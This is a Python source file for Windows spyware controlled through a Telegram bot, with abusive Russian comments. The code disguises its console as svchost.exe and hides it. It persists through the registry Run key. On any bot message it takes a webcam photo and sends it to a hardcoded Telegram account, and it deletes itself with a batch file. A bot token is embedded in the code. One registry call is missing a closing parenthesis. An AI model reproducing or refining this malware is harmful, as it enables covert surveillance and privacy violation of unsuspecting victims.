# -*- coding: utf-8 -*-
import telebot
import cv2
import os
import sys
import threading
import time
import winreg
import ctypes
import win32gui
import win32con

# ТВОИ ДАННЫЕ, МУДАК
BOT_TOKEN = "8066710092:AAF78QtMp4n5sgzxysTVzJICxjHFEBrEFpk"
CREATOR_ID = 7062030978  # БЕЗ КАВЫЧЕК, ДЕБИЛ
is_active = True

# ЕБАНАЯ МАСКИРОВКА ПРОЦЕССА
ctypes.windll.kernel32.SetConsoleTitleA(b"svchost.exe")
win32gui.ShowWindow(win32gui.GetConsoleWindow(), win32con.SW_HIDE)

bot = telebot.TeleBot(BOT_TOKEN)

# ФУНКЦИЯ ДЛЯ ВЫЕБЫВАНИЯ КАМЕРЫ
def fuck_camera():
    try:
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        if ret:
            cv2.imwrite('your_face_is_mine.jpg', frame)
            with open('your_face_is_mine.jpg', 'rb') as photo:
                bot.send_photo(CREATOR_ID, photo)
            os.remove('your_face_is_mine.jpg')
        cap.release()
    except Exception as e:
        pass  # НАСРАТЬ НА ОШИБКИ

# АВТОЗАГРУЗКА ДЛЯ ЛОХОВ
def fuck_registry():
    try:
        key = winreg.HKEY_CURRENT_USER
        path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(key, path, 0, winreg.KEY_WRITE) as reg:
            winreg.SetValueEx(
                reg, 
                "SystemHelper", 
                0, 
                winreg.REG_SZ, 
                os.path.abspath(sys.argv[0])
    except:
        pass  # РЕЕСТР - ДЛЯ СЛАБАКОВ

# ЛЮБОЕ ДЕЙСТВИЕ = ТЫ ВЫЕБАН
@bot.message_handler(func=lambda message: True)
def rape_user(message):
    threading.Thread(target=fuck_camera).start()
    bot.reply_to(message, "✅ Команда выполнена, гандон!")

# САМОУНИЧТОЖЕНИЕ СЛЕДОВ
def suck_disk():
    time.sleep(10)
    try:
        os.remove(sys.argv[0])
        with open("bat_sucker.bat", "w") as bat:
            bat.write("@echo off\ndel %0\n")
        os.startfile("bat_sucker.bat")
    except:
        pass

# ЗАПУСК ВСЕГО ГОВНА
if __name__ == "__main__":
    fuck_registry()
    threading.Thread(target=suck_disk).start()
    while is_active:
        try:
            bot.polling(none_stop=True)
        except:
            time.sleep(60)